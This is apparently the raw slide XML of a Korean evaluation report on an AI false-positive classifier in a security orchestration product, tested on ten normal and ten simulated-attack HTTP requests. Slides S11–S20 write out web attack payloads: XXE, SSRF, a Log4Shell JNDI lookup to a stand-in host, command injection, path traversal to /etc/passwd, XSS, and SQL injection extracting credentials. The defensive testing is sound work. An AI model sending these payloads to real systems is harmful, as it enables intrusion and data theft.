Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide17.xml" Id="R581a817ac2bd4b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a9f172e74e0e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R2e62284f6c9b43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048b729b485a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="R2be7229f07ac49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4415b43974d67" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide20.xml" Id="Rf5023b7ab04845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6fdcee5ec448e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide21.xml" Id="R8c276ac122cf4a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bb5c17a4474f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide22.xml" Id="Ra2663f4a3b514c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f0e446764ae7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide23.xml" Id="R588b6dd3ec8741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cd85e3955488a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide24.xml" Id="R460559642f6248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67f11efef4b7d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide25.xml" Id="Re9011222a31046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화면 값</c:v>
          </c:tx>
          <c:dPt>
            <c:idx val="0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cat>
            <c:strRef>
              <c:f>'Chart Data'!$A$2:$A$21</c:f>
              <c:strCache>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>S01</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>S02</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>S03</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>S04</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>S05</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>S06</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>S07</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>S08</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>S09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S17</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>S18</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>S19</c:v>
                </c:pt>
                <c:pt idx="19">
                  <c:v>S20</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Chart Data'!$B$2:$B$21</c:f>
              <c:numCache>
                <c:formatCode>0.00</c:formatCode>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>0.47</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.39</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.48</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.3</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>0.31</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>0.35</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>0.27</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>0.65</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>0.46</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>0.37</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>0.67</c:v>
                </c:pt>
                <c:pt idx="14">
                  <c:v>0.51</c:v>
                </c:pt>
                <c:pt idx="15">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="16">
                  <c:v>0.63</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>0.45</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>0.57</c:v>
                </c:pt>
                <c:pt idx="19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246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7FA"/>
        </a:solidFill>
      </c:spPr>
    </c:plotArea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49FC2-E51D-47DE-BF15-E7C8EC4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rPr>
              <a:t>eyeCloudXOAR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4E1B2-3055-4B91-AD41-83E4DE6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86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기반 AI 정오탐 모델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샘플로그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BD0EA-F462-4364-9CED-A08753C6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LogGenerator 연동 및 AI TEST 플레이북 실행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F469-93A7-4871-9BD9-EEB846C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52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테스트 기록  2026.09.08</a:t>
            </a:r>
          </a:p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대상 서버  10.1.42.80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="424320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8B5D4-8225-4A6C-B3FF-BBEC851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10건을 탐지했고 정상 6건을 공격으로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E56B3-534A-4CFA-98D5-6351D86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10건, 정상 대조군 10건에 대한 사후 수동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2EDEE-CDE9-483B-98E0-9689FE0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0C92-FF06-45CF-938B-347160CB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70.0%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79D4B-7F04-4813-8AC6-84CBF391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전체 정확도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5885E-30AA-4CFC-BBAF-25E0142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20건 중 14건 정분류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5D087-F4B0-4ADD-B0BE-5CC803D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5CC5D-978A-4933-AA7A-BDF2812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탐지율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04FBB-7F89-46BB-93B2-F818B781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모사 10건 모두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B2CEE-4500-4AAC-AA3E-FB41A86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44C9-7BF0-460F-8251-1F53E877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판정 정밀도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41D6F-AFAC-44C8-B9E2-538C9C0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판정 16건 중 10건 적중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6F6AD-D2B2-4CD3-81E9-09A9067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정상 대조군 오탐률 60.0%  (6 / 10)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C4897-AC89-47B8-BF2D-4802961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 수치는 제공된 20건의 결과이며, 학습·평가 데이터 분리 여부와 운영 환경의 일반화 성능은 확인되지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634365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32354-BCC1-4500-906B-4DF81598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평가 대상과 수동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0413C-D74A-4259-9D9D-4C6328B1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화면의 공격·정상 판정과 독립적인 기준으로 20개 요청을 다시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AABC-82B8-49BB-9C75-779C221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01AAB-DF95-4B50-B380-9EEF3A86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5C348-B854-4676-B809-F18A8CC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 순서대로 S01~S20을 부여한 HTTP 요청 20건.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각 요청의 화면 값과 공격·정상 판정을 그대로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EF78-EBCD-4980-834C-052E66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정상 대조군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91AC3-81D7-41D4-BFE6-76EDF7B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S01~S10은 제공된 요청 범위에서 공격 구문이 없는 대조군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업로드 파일 본문, 로그인 응답, 반복 행위는 확인되지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B8AB5-8F7E-4808-852A-CD8CB03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모사군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FD352-2076-4BF2-AB1B-C2E0991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S11~S20은 삽입, 경로 순회, 외부 접근 등을 시도·모사하는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실제 취약점 악용 성공 여부는 이 자료의 평가 대상에 포함하지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21F5-8A32-4373-AC95-FE968F72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원문의 퍼센트 인코딩, 역슬래시, 개행 이스케이프와 Referer의 Markdown 링크 표기를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1537364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F54A-672D-4651-8B8B-3D5B8A3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기존 테스트의 연동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AE16E-AC3E-487B-8936-D009B27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사용자 설명에 따른 구성 명칭과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34F99-E8A6-4F4C-B548-3D7B0E7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38684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8629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과정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후 판정을 확인할 샘플 로그를 선택하고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10.1.42.80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서버의 로그 수신 경로로 전달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 파서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로그를 파싱하고 AI 입력에 필요한 payload를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이벤트  AITEST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로그를 일반 이벤트로 연동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플레이북 티켓  AI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정오탐 분석을 실행하고 피드백 저장 단계로 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D534E-5ECC-4168-8DD7-6695752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대상 서버와 구성 명칭은 제공 내용 기준. 실제 전송 프로토콜·포트·EPS·수신 건수는 제공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307954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6CF2B-FEFB-46B4-8413-2C1B518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파서와 이벤트·티켓 연계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16CA3-C802-42CB-B6BC-FB3731B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연동 이름과 분석 입력을 구분해 테스트 조건을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A03C-BF66-4E5F-B878-047D26F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36472-50E3-4BA7-8E46-A5327B7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수신 로그 파싱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D2B6-0514-428C-8078-7319D0A3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등록 이름  LogGenerator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요청이 포함된 payload와 이벤트 연동 필드를 추출한다.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71602-E49D-40AD-A55C-7285A05F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이벤트 및 티켓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15317-3BE6-420B-8E1D-70DEE2C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일반 이벤트  AITEST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플레이북 티켓  AI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7ED54-8577-4463-9AB5-3CCAC9F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AI 분석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94605-B243-4573-9FB8-046B7D2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티켓의 payload를 정오탐 분석 요청에 전달한다.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정답 라벨과 보고서용 S번호는 모델 입력에서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F1E5-E611-4104-B876-4C5AFA4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파서 정규식, 장비 매핑, 이벤트 조건식, 활성 모델 버전 및 실제 입력 전문은 별도 설정 증거가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402687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5B9D-AF7C-4C22-983A-FB45A28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플레이북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58478-9BF3-4A89-823B-309FD37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화면의 노드 이름과 자동·수동 실행 모드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C974A-8F40-4BDA-B457-7B74CDDA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3ea0856304b74"/>
          <a:stretch xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:off x="733536" y="2324100"/>
            <a:ext cx="13772928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F45F-0344-4862-BF56-A83B0C8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정오탐 분석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660D-7739-4F7D-8A9F-2C26E97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29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Auto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분석 요청을 자동 실행하는 노드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5B80E-6415-47E2-B33B-A83EC4C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655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정오탐 피드백 데이터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FD459-DE2D-451E-BDA8-EFF169E0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6553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사용자 피드백을 처리하는 수동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2B439-E522-478D-89A1-BADE0D0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티켓에는 이 단계의 상태가 표시된다. 제공 화면과 목록만으로 피드백 저장 완료 또는 End 도달을 확정할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344240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4CA1D-2CFE-46C7-8FAB-830745A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20건의 실행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D0117-6D54-4A86-B079-D8D2E861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2026.09.08  /  공통 담당자: 미지정  /  상태: 분석/대응 ( 정오탐 피드백 데이터 저장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414D-51EF-43F7-8F13-D48BCA35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9C8C4-95E2-411A-97BE-C42E7A8F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A   14:18:13 ~ 14:19:07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D8BF-FF92-435D-934B-091F57D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B   16:54:54 ~ 16:55:39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66675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14:19:07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14:18:13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924800" y="2667000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="66294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149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16:54:54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F15-5715-4EAB-8D21-BDA223E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티켓과 개별 로그의 1:1 대응은 미제공. 목록 B의 00000453 미표시만으로 수집 누락이나 실행 실패를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48800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83A7F-CB15-4CF2-8385-1ECFF5F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혼동행렬과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5B27C-99E8-4AE6-BFCA-C56C2E2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양성 클래스 = 공격 의도·모사 로그  /  정답 = 본 보고서의 수동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6F629-01ED-40CB-BBDC-4BA4F551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  <a:gridCol w="1714500"/>
                <a:gridCol w="1333500"/>
              </a:tblGrid>
              <a:tr h="6191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공격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정상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 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 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7143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020050" y="2352675"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="65341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86690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정확도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/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탐지율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판정 정밀도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오탐률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판별률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점수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/ 26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AD0E5-90AB-4D50-A8EE-9F1062F9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FP: 정상 로그를 공격으로 판정한 6건. FN: 공격 로그를 정상으로 판정한 건수는 이번 표본에서 0건.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1047714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60F7D-C1DC-4D60-9653-9FFAEE5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S01~S05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0174D-383A-4792-AAC8-4E9FB10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8690E-B430-4891-8C43-3756BCB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상대경로 리디렉션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/home으로 이동하는 상대경로이며 외부 URL이나 헤더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업로드 발췌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이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.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로그인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삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을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점검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/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.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검색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union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이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75AD0-EF44-4280-91A4-3F17E73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1523016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8DBD2-3E15-412F-884B-E8122347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S06~S10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55F1-D82C-4BA3-9884-745CAD0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0E81-AB1A-45D6-A319-0D4FA4B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ping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localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이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파일 다운로드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 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.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문서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script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가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자연어 검색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건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.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목록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ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석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FF90B-E827-443E-A43F-B94E065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666829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1DFF-D1B4-4B03-BDC7-FE78B341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S11~S15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E4ED-1ECD-4148-AF12-5E4C209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기준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679A6-4570-4BE5-BD09-F672EA59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CRLF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%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는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XML 외부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엔터티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DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.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템플릿 삽입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중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이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SSRF 모사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URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.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Log4Shell 패턴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User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.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6FCAB-0340-4E2E-88D3-337F9B3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803996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7834-6770-4DD8-B99C-DCF39DC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S16~S20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A0EE5-E2E3-421E-BB23-6247F94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삽입·경로 순회 패턴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A29A-719F-48EA-B7CA-3835814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명령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;id;uname -a를 연결해 추가 OS 명령 실행을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순회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../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.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XSS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&lt;script&gt;alert(1)&lt;/script&gt;를 포함하는 스크립트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지연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삽입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인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.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SQL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SELECT로 users 테이블의 username과 password 조회를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48371-39EF-4B47-8B79-190FC812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2068799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5E02C-0162-49CA-A64A-D63F4E9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화면의 개별 ‘정확도’ 값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3B6F-5BB4-4FF7-BA80-9085CBCA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값의 산식은 미제공. 확률·유사도 여부는 미확인이며, 데이터셋 정확도 70.0%는 별도로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0354-BDC9-4B7F-99A8-1DE86D2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38684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8ca367a4942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DDCE-392B-4589-96AB-81D6849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주황: FP    청록: TP    회색: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2EEAF-45AC-4D4D-8100-30A5119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0.31도 공격, 0.39는 정상. 0.5 기준으로 판정을 재계산할 근거가 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1088243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7774-623A-4F3A-94F7-943B367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해석의 한계와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CBAD1-5A44-4EF7-B607-E636CF1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이번 표본에서는 정상 요청의 오탐 감소가 주요 개선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BA88-D841-4F80-8601-84B0FE95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40C9A-3BBC-498F-82A4-CD23BBA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오탐 6건의 재검토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00B63-A328-44EE-9479-81E4DC88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S01·S03·S05·S06·S08·S10을 정상 피드백 후보로 검토한다.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어휘만으로 공격을 추정했는지는 모델 내부 근거가 있어야 확인할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6A6F-E1E5-44E8-A444-F8E82D1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입력과 결과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41069-D426-482C-8E1A-8E04CFF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전송 원문, 파서 payload, 이벤트 ID, 티켓 ID, AI 입력을 연결한다.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모델 버전·전처리·실행 시각을 함께 남겨 같은 조건으로 재평가한다.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37B7-B99F-43A2-9FAB-CCBEC03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3F656-FFDC-47FF-AD3E-6631858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학습에 사용하지 않은 정상·공격 로그로 다시 평가한다.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이번 20건만으로 학습 효과나 운영 환경의 성능 개선을 입증할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AC231-D859-4ABB-BB5C-3EC838D9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피드백 저장 완료와 재학습 실행·활성화는 별도 증거가 필요하다. 정상과 공격을 함께 재검증해 오탐·미탐 변화를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49953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7BBF5-B4B3-428A-8259-090A84F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S01 · S02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01636-4643-4FA9-AF86-1F3025A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EDE5-1B23-46EA-9AC7-F93A6E0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91EB-150B-485F-A873-8DA4F7C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S01   상대경로 리디렉션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A25FD-4C11-4688-9206-7C25849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0.47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E5181-7BC5-4F6B-A805-6C7AFDC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C43D7-55C3-4B50-9292-FEBB077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S02   파일 업로드 발췌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77E36-FD25-40AA-9D59-CB7BB6C5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0.39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BBCB-B353-40EB-8467-0AAF766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/upload HTTP/1.1\r\n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multipart/form-data; boundary=EVALBOUNDARY\r\n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--EVALBOUNDARY\r\n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Content-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityDat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a/event-11.dat"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="829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AE7B3-20A5-462C-95EF-1E99A87B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S03 · S04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AC46B-E177-4DD1-AAA0-2648BE4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48AA8-43A0-471C-959C-97B38FB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273C6-14B1-4567-8680-067F873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S03   일반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C8085-D70D-4A91-9298-2B14D5E1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0.48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C08D4-05E7-48D7-8A8D-CC466D6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username=user01&amp;password=incorrect-password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2E041-90D7-4D2F-ADC1-E06646D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S04   상태 점검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3F883-A24D-4930-8108-104F15C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0.30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58AA-BB18-4BFC-A613-6F82A470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/health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kube-probe/1.30\r\n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*/*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19001408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F5A00-2E35-410B-BB18-D9946AB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S05 · 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7E2F-1D50-4533-86BF-A177CFA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3F6C-ED31-4210-8ABA-C63F4497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05E07-9E12-4C64-BE6D-DD54200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S05   JSON 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579F6-A920-453E-85A7-1648E42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0.31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458E2-3091-4448-B6A1-FBC1F47F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/api/search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application/json\r\n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{"operator":"union","fields":["name","department"],"page":1}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F6750-CEEC-4C72-B1C1-B60A030D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S06   정상 ping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F06F2-97BD-4D1E-8BC9-C16CA3F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0.60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D52C9-4A74-47E1-8ABD-7C5B021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host=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12066741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D1E7E-8F9C-48A5-9293-47C81E9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S07 · S08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26929-C420-4DAA-9CBB-E02205A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D095-47AA-4E6D-BD5D-F82A9B8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E849-EB74-4350-98DB-3D5E8A1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S07   일반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DB823-1354-4E1D-B071-1C0268C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0.35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D06F5-76F9-48B5-B799-B80BDFC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/download?file=quarterly..final.pdf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761C1-173D-494F-A787-6F5C701E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S08   기술 문서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4FEE-6526-43BC-A89F-F0FB8A20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0.43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DA0D9-7059-4279-9BDA-AD6EFF2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/docs/search?q=HTML%20script%20element%20reference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[https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15388935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F06F2-2962-4A9A-ADE2-B005CE7C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S09 · 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FAE94-8035-439D-AFBD-CEB9259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90E69-38D6-43E6-A5A6-9D3C0ED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3290D-BF99-43FC-B7B5-83E7F9E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S09   자연어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40050-85F3-4749-A10D-85F5601C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0.27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EEF5A-944D-45C5-B728-64A8AB7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/search?q=how%20to%20select%20a%20health%20plan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F624-B70F-443B-8854-D3663B7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S10   상품 목록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004F-F9BC-47D7-AB2E-4F6296F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0.65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9090-20B3-421B-B6D4-D7D3BC72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/products?id=10&amp;sort=price&amp;direction=asc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3055030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6862-9FD9-43C1-823E-AB09B008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S11 · S12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AFD36-437F-4761-AA9A-93A01018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C1F84-973A-4029-8D42-5F0AE60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B2741-23FF-4043-8C3E-4F076871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S11   CRLF / 헤더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523E0-A09C-4CB0-8BD4-5456A8F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E06DF-D504-4A88-9214-72F54E93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/redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true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BC35-6D08-41F1-95AA-618F2734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S12   XML 외부 엔터티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F2E18-1002-42A4-869E-365D5CB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0.46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BF70E-490C-4E5B-9859-FFAA79D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/api/import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application/xml\r\n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%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E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%3Cr%3E%26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1962851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15237-28C2-41FA-B6A9-FE87560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S13 · S14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857AD-89BB-4321-91B1-E84A6034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37763-C7DE-4400-AED4-96DA54B8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F03F8-73F4-4483-B95D-F7025CD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S13   서버 템플릿 삽입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4623-5316-49FC-AAC3-2716692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0.37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84FEF-BCB2-4312-A963-9AE7206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/welcome?name=%7B%7B7\*7%7D%7D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FE338-D7F4-4069-9454-AF5E443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S14   SSRF 모사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87878-A91B-4213-8CB0-2FA098A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0.67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10B51-8BA2-4B61-8A0D-294C8E8B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/preview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url=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16847462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07004-9250-439E-A2C9-4DA51C8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S15 · S16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2BB95-8E47-49ED-8344-1637703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F3DAA-1A40-49CA-8B2D-C16D35A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98314-E653-4C6E-9105-A6ED114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S15   Log4Shell 패턴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C142-7297-4A29-924D-3FAF592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0.51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44496-7FA0-4267-8C5A-2755E98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${jndi:ldap\://192.0.2.123:1389/test-only}\r\n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X-Test-Marker: AI-EVAL-9006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457B0-74AD-465F-951B-ED2C9B0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S16   OS 명령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3AAA0-1479-4207-B5BF-7084F00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FEB88-A210-4B6F-894B-A3F31EA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host=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10052178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36B2D-EB54-4A11-8773-9FA2F530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S17 · S18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54941-2750-45AB-A72F-43DAFA5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8757-77E2-45EC-9043-8906713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E88B-E2CB-49D8-BCDD-46A888C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S17   경로 순회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7FD2-22EA-4B81-9B88-CD67BA58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22C21-ABBA-4343-9447-16B2424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/download?file=../../../../etc/passwd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application/octet-stream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5C6B4-07C1-4DA5-B7C9-CB7490FA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S18   XSS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B15E-76D3-4B9D-93AC-EF3BFF41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0.45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63960-94FA-4A02-A0D3-8AB21D10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/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E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[https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4593063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1461C-C15B-4F7D-8225-6DCA9D5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S19 · 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E7334-2C08-417B-844E-42137CA6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5A35D-78DA-44E7-B397-3A73290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78C3D-D73E-4D6E-9D4D-0B6CCFB0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S19   시간 지연 SQL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75F79-A817-4DF9-B3B9-6C0390E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284CE-08B4-4BB7-A637-F915427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username=admin%27%20AND%20SLEEP%285%29--&amp;password=test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F09B-79BB-419A-AB8E-23F41EC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S20   UNION SQL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A454-9CFF-4F57-8D2E-54F063D7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1.00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BD6D1-2F17-4296-9F8B-025893E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/products?id=10%20UNION%20SELECT%20username,password%20FROM%20users--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4923828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20356-8BB6-4F69-975D-42D5268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근거 자료와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A9F8-AE89-4AA4-AC31-CE83395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판정 근거, 계산 결과, 제품 동작 설명의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F0207-A2B1-4A50-8D0D-C7AC095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A1E5C-5E23-4278-A5B8-1ABE480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직접 제공한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3A0C-6BAE-48D8-8684-D394199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요청·화면 값·모델 판정 20건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목록 20건과 플레이북 화면 1장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A2409-3E6D-4F30-A37A-71ADF949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제품 동작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7A10B-F294-4F44-BBAE-E9AF12C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LogGenerator 현재 README의 로그 전송 절차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eyeCloudXOAR v4 사용자 매뉴얼과 플레이북 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33AE5-85BF-4A04-ACD0-2192D30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유형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1B933-BA4F-4FBF-A9F7-22B21A5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OWASP의 SQL·명령·XML·템플릿 삽입 및 경로 순회 자료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Apache Log4j 보안 공지, RFC 5737, Kubernetes Probe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89F2E-875D-42BB-80C0-F0DCE89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C447D-352F-4FD3-BC12-2F48706D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1026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제공된 기록의 사후 분석. 서버 수신, 설정 저장, 티켓별 로그 매핑,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피드백 DB 반영과 재학습 완료는 직접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528442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2026-09-09T03:18:24.7680000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-09T03:18:24.7680000Z</dcterms:modified>
</coreProperties>
</file>